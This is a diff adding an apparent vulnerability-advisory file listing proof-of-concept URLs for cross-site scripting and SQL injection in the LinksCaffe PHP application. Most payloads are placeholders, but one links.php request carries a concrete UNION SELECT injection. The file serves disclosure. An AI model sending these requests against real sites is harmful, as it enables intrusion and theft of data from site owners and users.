@@ -1,0 +1,22 @@
+The following examples were provided to demonstrate cross-site scripting in LinksCaffe:
+
+http://www.example.com/linkscaffe/counter.php?tablewidth='%3E[XSS]<p+
+
+http://www.example.com/linkscaffe/links.php?action=new&newdays=[XSS]
+
+http://www.example.com/linkscaffe/menu.inc.php?tableborder='%3E[XSS]
+
+http://www.example.com/linkscaffe/menu.inc.php?menucolor='%3E[XSS]
+
+http://www.example.com/linkscaffe/menu.inc.php?textcolor='%3E[XSS]
+
+http://www.example.com/linkscaffe/menu.inc.php?bodycolor='%3E[XSS] 
+
+
+The following examples were provided to demonstrate SQL injection in LinksCaffe:
+
+http://www.example.com/linkscaffe/links.php?cat=1&offset=[SQL]
+http://www.example.com/linkscaffe/links.php?cat=1&limit=[SQL] 
+http://www.example.com/linkscaffe/links.php?action=new&newdays=[SQL] 
+http://www.example.com/linkscaffe/links.php?action=deadlink&link_id=[SQL] 
+http://www.example.com/linkscaffe/links.php?action=new&newdays=-1+UNION+SELECT+123456/* 
